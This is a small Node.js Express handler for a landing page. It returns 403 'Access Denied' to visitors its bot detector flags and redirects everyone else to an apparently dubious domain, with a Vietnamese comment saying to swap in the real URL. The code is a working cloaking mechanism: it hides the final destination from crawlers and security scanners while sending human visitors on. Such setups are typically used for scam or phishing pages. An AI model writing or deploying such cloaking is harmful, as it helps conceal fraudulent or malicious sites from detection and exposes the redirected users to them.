const { isBot } = require('../utils/botDetector');

const finalUrl = 'https://playy-hjt.club/'; // ← sửa thành URL thật

function handleLandingRedirect(req, res) {
  const userAgent = req.get('User-Agent') || '';

  if (isBot(userAgent)) {
    return res.status(403).send('Access Denied');
  }

  return res.redirect(finalUrl);
}

module.exports = {
  handleLandingRedirect
};
